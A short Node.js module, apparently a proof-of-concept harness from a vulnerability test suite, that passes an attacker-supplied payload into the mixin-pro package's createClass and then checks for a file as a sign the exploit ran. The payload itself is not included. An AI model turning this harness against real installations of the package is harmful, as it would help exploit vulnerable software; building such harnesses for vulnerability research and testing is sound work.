function exploitFunction(payload) {
    const fs = require("fs");
    const Class = require("mixin-pro").createClass;
    const path = "./mixin-pro";

    const { Foo } = payload;

    try {
        let Bar1 = Class(Foo, { constructor: Foo });
    } catch (error) {}

    const file_exist = fs.existsSync(path);
    return file_exist;
}

module.exports = { exploitFunction };